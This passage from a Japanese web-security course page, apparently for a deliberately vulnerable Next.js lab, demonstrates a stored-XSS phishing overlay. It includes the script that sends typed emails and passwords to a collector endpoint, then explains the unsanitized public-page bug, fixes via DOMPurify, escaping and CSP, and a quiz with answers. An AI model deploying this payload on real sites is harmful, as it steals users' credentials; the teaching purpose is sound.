+<span id="cb58-41"><a href="#cb58-41" aria-hidden="true" tabindex="-1"></a><span class="ot">             autocomplete</span><span class="op">=</span><span class="st">&quot;current-password&quot;</span><span class="dt">&gt;</span></span>
+<span id="cb58-42"><a href="#cb58-42" aria-hidden="true" tabindex="-1"></a>      <span class="dt">&lt;</span><span class="kw">button</span><span class="ot"> type</span><span class="op">=</span><span class="st">&quot;submit&quot;</span><span class="dt">&gt;</span>ログイン<span class="dt">&lt;/</span><span class="kw">button</span><span class="dt">&gt;</span></span>
+<span id="cb58-43"><a href="#cb58-43" aria-hidden="true" tabindex="-1"></a>    <span class="dt">&lt;/</span><span class="kw">form</span><span class="dt">&gt;</span></span>
+<span id="cb58-44"><a href="#cb58-44" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&lt;/</span><span class="kw">div</span><span class="dt">&gt;</span></span>
+<span id="cb58-45"><a href="#cb58-45" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;/</span><span class="kw">div</span><span class="dt">&gt;</span></span>
+<span id="cb58-46"><a href="#cb58-46" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">script</span><span class="dt">&gt;</span></span>
+<span id="cb58-47"><a href="#cb58-47" aria-hidden="true" tabindex="-1"></a>  <span class="bu">document</span><span class="op">.</span><span class="fu">getElementById</span>(<span class="st">&#39;xss-form&#39;</span>)<span class="op">.</span><span class="fu">addEventListener</span>(<span class="st">&#39;submit&#39;</span><span class="op">,</span> <span class="kw">function</span>(e) {</span>
+<span id="cb58-48"><a href="#cb58-48" aria-hidden="true" tabindex="-1"></a>    e<span class="op">.</span><span class="fu">preventDefault</span>()<span class="op">;</span></span>
+<span id="cb58-49"><a href="#cb58-49" aria-hidden="true" tabindex="-1"></a>    <span class="kw">const</span> email <span class="op">=</span> <span class="bu">document</span><span class="op">.</span><span class="fu">getElementById</span>(<span class="st">&#39;xss-email&#39;</span>)<span class="op">.</span><span class="at">value</span><span class="op">;</span></span>
+<span id="cb58-50"><a href="#cb58-50" aria-hidden="true" tabindex="-1"></a>    <span class="kw">const</span> pass  <span class="op">=</span> <span class="bu">document</span><span class="op">.</span><span class="fu">getElementById</span>(<span class="st">&#39;xss-pass&#39;</span>)<span class="op">.</span><span class="at">value</span><span class="op">;</span></span>
+<span id="cb58-51"><a href="#cb58-51" aria-hidden="true" tabindex="-1"></a>    <span class="fu">fetch</span>(<span class="st">&#39;/api/xss?c=&#39;</span> <span class="op">+</span> <span class="pp">encodeURIComponent</span>(<span class="st">&#39;email=&#39;</span> <span class="op">+</span> email <span class="op">+</span> <span class="st">&#39;&amp;pass=&#39;</span> <span class="op">+</span> pass))<span class="op">;</span></span>
+<span id="cb58-52"><a href="#cb58-52" aria-hidden="true" tabindex="-1"></a>    <span class="bu">document</span><span class="op">.</span><span class="fu">getElementById</span>(<span class="st">&#39;xss-overlay&#39;</span>)<span class="op">.</span><span class="fu">remove</span>()<span class="op">;</span></span>
+<span id="cb58-53"><a href="#cb58-53" aria-hidden="true" tabindex="-1"></a>    location<span class="op">.</span><span class="at">href</span> <span class="op">=</span> <span class="st">&#39;/&#39;</span><span class="op">;</span></span>
+<span id="cb58-54"><a href="#cb58-54" aria-hidden="true" tabindex="-1"></a>  })<span class="op">;</span></span>
+<span id="cb58-55"><a href="#cb58-55" aria-hidden="true" tabindex="-1"></a>  <span class="bu">document</span><span class="op">.</span><span class="fu">getElementById</span>(<span class="st">&#39;xss-close&#39;</span>)<span class="op">.</span><span class="fu">addEventListener</span>(<span class="st">&#39;click&#39;</span><span class="op">,</span> <span class="kw">function</span>() {</span>
+<span id="cb58-56"><a href="#cb58-56" aria-hidden="true" tabindex="-1"></a>    <span class="bu">document</span><span class="op">.</span><span class="fu">getElementById</span>(<span class="st">&#39;xss-overlay&#39;</span>)<span class="op">.</span><span class="fu">remove</span>()<span class="op">;</span></span>
+<span id="cb58-57"><a href="#cb58-57" aria-hidden="true" tabindex="-1"></a>  })<span class="op">;</span></span>
+<span id="cb58-58"><a href="#cb58-58" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;/</span><span class="kw">script</span><span class="dt">&gt;</span></span></code></pre></div>
+      <h3 data-number="9.4.2" id="被害者としてページを訪問する-1"><span
+      class="header-section-number">9.4.2</span> 2. 被害者としてページを訪問する</h3>
+      <p><strong>別のブラウザ</strong>またはシークレットウィンドウで以下にアクセスしてください。</p>
+      <pre><code>http://localhost:3000/about/piyopiyo</code></pre>
+      <p><strong>URLは完全に普通の見た目です。</strong> <code>/about/piyopiyo</code> というパスに
+      XSS
+      を示す文字列は含まれていません。にもかかわらず、ページを開いた瞬間にオーバーレイが表示されることを確認してください。</p>
+      <h3 data-number="9.4.3" id="認証情報を入力して送信する"><span
+      class="header-section-number">9.4.3</span> 3. 認証情報を入力して送信する</h3>
+      <ol type="1">
+      <li>オーバーレイが表示されたら、<strong>ダミーのメールアドレスとパスワード</strong>を入力してください。</li>
+      <li>「ログイン」ボタンをクリックしてください。</li>
+      <li>オーバーレイが消え、トップページページにリダイレクトされることを確認してください。</li>
+      </ol>
+      <h3 data-number="9.4.4" id="盗まれた認証情報を確認する"><span
+      class="header-section-number">9.4.4</span> 4. 盗まれた認証情報を確認する</h3>
+      <p><code>npx prisma studio</code> から <code>stolen_contents</code>
+      テーブルを開いて、<code>content</code>
+      列に入力したメール・パスワードが記録されていること😭を確認してください。</p>
+      <h2 data-number="9.5" id="なぜ-memberabout-の-preview-では攻撃が成立しないのか"><span
+      class="header-section-number">9.5</span> なぜ /member/about の Preview
+      では攻撃が成立しないのか</h2>
+      <p><code>/member/about</code> の Preview セクションは <code>AboutView</code>
+      コンポーネントを使っており、 <code>DOMPurify.sanitize()</code> が適用されるため
+      <code>&lt;style&gt;</code> や <code>&lt;script&gt;</code> タグが除去されます。</p>
+      <div class="sourceCode" id="cb60"
+      data-caption="src/app/_components/AboutView.tsx（抜粋）サニタイズ処理"
+      data-startFrom="13"><pre class="sourceCode numberSource tsx numberLines"><code class="sourceCode" style="counter-reset: source-line 12;"><span id="cb60-13"><a href="#cb60-13"></a>const sanitizedContent = DOMPurify.sanitize(about.aboutContent, {</span>
+<span id="cb60-14"><a href="#cb60-14"></a>  ALLOWED_TAGS: [&quot;b&quot;, &quot;i&quot;, &quot;font&quot;, &quot;br&quot;], // 許可するタグ</span>
+<span id="cb60-15"><a href="#cb60-15"></a>  ALLOWED_ATTR: [&quot;color&quot;, &quot;size&quot;], // 許可する属性</span>
+<span id="cb60-16"><a href="#cb60-16"></a>});</span></code></pre></div>
+      <div class="sourceCode" id="cb61" data-caption="src/app/_components/AboutView.tsx（抜粋）"
+      data-startFrom="27"><pre class="sourceCode numberSource tsx numberLines"><code class="sourceCode" style="counter-reset: source-line 26;"><span id="cb61-27"><a href="#cb61-27"></a>&lt;div</span>
+<span id="cb61-28"><a href="#cb61-28"></a>  dangerouslySetInnerHTML={{ __html: sanitizedContent }}</span>
+<span id="cb61-29"><a href="#cb61-29"></a>  className=&quot;mr-1&quot;</span>
+<span id="cb61-30"><a href="#cb61-30"></a>/&gt;</span></code></pre></div>
+      <p>一方、公開ページ <code>/about/[slug]</code>
+      では<strong>サニタイズなし</strong>で直接出力しています。</p>
+      <div class="sourceCode" id="cb62"
+      data-caption="src/app/about/[slug]/page.tsx（抜粋）💀 サニタイズなし" data-startFrom="43"><pre
+      class="sourceCode numberSource tsx numberLines"><code class="sourceCode" style="counter-reset: source-line 42;"><span id="cb62-43"><a href="#cb62-43"></a>&lt;div dangerouslySetInnerHTML={{ __html: user.aboutContent }} /&gt;</span></code></pre></div>
+      <p>この非対称性が脆弱性を生みます。<span
+      class="masked">編集画面では問題なく見えるが、公開ページでは攻撃が成立する</span>
+      というケースは実際のバグとして発生しやすいパターンです。</p>
+      <p><strong><i class="fa-solid fa-comment-dots fa-flip-horizontal"></i>プロンプト例</strong></p>
+      <blockquote>
+      <p>同じアプリで「編集プレビューでは XSS
+      が動かないのに、公開ページでは動く」という非対称性はなぜ起きますか？このようなバグが実際のアプリで発生しやすい理由についても教えてください。</p>
+      </blockquote>
+      <h2 data-number="9.6" id="防止策-1"><span class="header-section-number">9.6</span> 防止策</h2>
+      <h3 data-number="9.6.1" id="dompurify-によるサニタイズaboutview-コンポーネントを使う"><span
+      class="header-section-number">9.6.1</span> 1. DOMPurify によるサニタイズ（AboutView
+      コンポーネントを使う）</h3>
+      <p><code>/about/[slug]/page.tsx</code> を以下のように変更してください。</p>
+      <div class="sourceCode" id="cb63" data-caption="src/app/about/[slug]/page.tsx（修正案 A）"
+      data-startFrom="1"><pre class="sourceCode numberSource tsx numberLines"><code class="sourceCode"><span id="cb63-1"><a href="#cb63-1"></a>import { AboutView } from &quot;@/app/_components/AboutView&quot;;</span>
+<span id="cb63-2"><a href="#cb63-2"></a></span>
+<span id="cb63-3"><a href="#cb63-3"></a>&lt;AboutView about={{</span>
+<span id="cb63-4"><a href="#cb63-4"></a>  userName: user.name,</span>
+<span id="cb63-5"><a href="#cb63-5"></a>  aboutSlug: slug,</span>
+<span id="cb63-6"><a href="#cb63-6"></a>  aboutContent: user.aboutContent,</span>
+<span id="cb63-7"><a href="#cb63-7"></a>}} /&gt;</span></code></pre></div>
+      <p><code>AboutView</code> 内の DOMPurify は<span
+      class="masked">削除方式（許可リスト）</span>で動作するため、<code>&lt;style&gt;</code>,
+      <code>&lt;script&gt;</code>, <code>onerror</code> などをすべて除去します。
+      オーバーレイを構成する <code>&lt;style&gt;</code> ブロックも
+      <code>&lt;div id="xss-overlay"&gt;</code> も削除されるため、
+      攻撃ペイロードを仕込み直しても画面には何も表示されなくなります。</p>
+      <h3 data-number="9.6.2" id="react-のデフォルトエスケープ-1"><span
+      class="header-section-number">9.6.2</span> 2. React のデフォルトエスケープ</h3>
+      <p>HTML レンダリングが不要ならば <code>dangerouslySetInnerHTML</code>
+      を使わないのが最善策となります。</p>
+      <div class="sourceCode" id="cb64"
+      data-caption="src/app/about/[slug]/page.tsx（修正案 B）"><pre
+      class="sourceCode numberSource tsx numberLines"><code class="sourceCode"><span id="cb64-1"><a href="#cb64-1"></a>{/* &lt;div dangerouslySetInnerHTML={{ __html: user.aboutContent }} /&gt; */}</span>
+<span id="cb64-2"><a href="#cb64-2"></a>&lt;div&gt;{user.aboutContent}&lt;/div&gt;</span></code></pre></div>
+      <h3 data-number="9.6.3" id="content-security-policycspヘッダー発展"><span
+      class="header-section-number">9.6.3</span> 3. Content Security
+      Policy（CSP）ヘッダー（発展）</h3>
+      <p>HTTP レスポンスヘッダーに CSP を設定すると、インラインの <code>&lt;style&gt;</code> や
+      <code>&lt;script&gt;</code> の実行を ブラウザレベルでブロックできます。</p>
+      <pre><code>Content-Security-Policy: default-src &#39;self&#39;; script-src &#39;self&#39;; style-src &#39;self&#39;</code></pre>
+      <p>Next.js では <code>next.config.ts</code> の <code>headers()</code> または
+      <code>middleware.ts</code> で設定できます。 ただし CSP
+      はバイパス手法も存在するため、サニタイズの代替ではなく<strong>追加の防御層</strong>として扱います。詳しくは次週で扱います。</p>
+      <h3 data-number="9.6.4" id="演習-5"><span class="header-section-number">9.6.4</span>
+      📝演習</h3>
+      <p><code>/about/[slug]/page.tsx</code> の脆弱性を修正してください。</p>
+      <h3 data-number="9.6.5" id="定着確認-2"><span class="header-section-number">9.6.5</span>
+      定着確認</h3>
+      <p>以下の説明は「正しい」か「正しくない」かを答えよ。</p>
+      <ul>
+      <li><code>httpOnly: true</code>
+      が設定されていれば、フィッシングオーバーレイによるパスワード窃取を防ぐことができる。
+      <ul>
+      <li><strong>答え</strong>：<span class="masked">正しくない。<br><code>httpOnly</code> は
+      Cookie を JavaScript
+      から保護しますが、ユーザが自分でフォームに入力した値を守ることはできません。フォームの入力値は
+      JS から常に読み取れます。</span></li>
+      </ul></li>
+      <li><code>dangerouslySetInnerHTML</code> を使っても、DOMPurify でサニタイズすれば XSS
+      を防げる。
+      <ul>
+      <li><strong>答え</strong>：<span class="masked">正しい。<br>ただし DOMPurify の
+      <code>ALLOWED_TAGS</code> / <code>ALLOWED_ATTR</code>
+      の設定が適切に絞り込まれていることが前提です。</span></li>
+      </ul></li>
+      <li>DOMPurify はブラックリスト方式で動作するため、新しい攻撃手法にも対応できる。
+      <ul>
+      <li><strong>答え</strong>：<span class="masked">正しくない。<br>DOMPurify
+      は削除方式（許可リスト）で動作します。ブラックリスト方式は既知の悪意あるパターンを列挙する方式であり、新手法には脆弱です。</span></li>
+      </ul></li>
+      <li>CSP を設定すれば、サニタイズなしでも XSS を防止できる。
+      <ul>
+      <li><strong>答え</strong>：<span class="masked">正しくない。<br>CSP
+      にはバイパス手法が存在し、サニタイズの代替にはなりません。サニタイズと組み合わせる多層防御として扱ってください。</span></li>
+      </ul></li>
+      </ul>
+      <h1 data-number="10" id="補足"><span class="header-section-number">10</span> 補足</h1>
+      <p><strong><i class="fa-solid fa-comment-dots fa-flip-horizontal"></i>プロンプト例</strong></p>
+      <blockquote>
+      <p>React (Next.js) において、<code>dangerouslySetInnerHTML</code> 以外で、XSS
+      リスクが生じる可能性のある構文、API、実装パターンについて整理してください。</p>
+      </blockquote>
       <!-- ---------------------------------------- -->
     </main>
 
